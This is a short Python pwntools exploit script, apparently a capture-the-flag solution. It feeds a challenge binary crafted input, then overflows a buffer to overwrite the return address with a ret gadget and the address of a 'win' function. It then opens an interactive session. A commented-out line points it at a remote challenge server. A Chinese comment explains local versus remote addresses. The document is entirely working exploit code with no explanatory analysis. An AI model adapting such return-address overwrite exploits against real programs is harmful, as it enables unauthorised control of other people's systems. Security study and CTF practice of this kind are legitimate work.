from pwn import *

elf = ELF('../file/a.out')
libc = elf.libc

context.binary = elf
context.log_level = 'DEBUG'

p = elf.process()
#p = remote('challs.htsp.ro', '8004')
p.recvuntil(b'character:')
p.sendline(b'a')

p.recvuntil(b'symbols:')
input('conitnue?')
p.sendline(b'AAABBBCCCDDDEEEFFF\x00\x00')

p.recvuntil(b'greeting:')

# 这里是本地编译后得到的地址，注释的为远端程序对应的地址
ret = 0x004005ee #0x004011FC
win = 0x004007b8 #0x004011E7
main = 0x0040131E

p.sendline(p64(0) + b'AAAAA' + p64(ret) + p64(win))

p.interactive()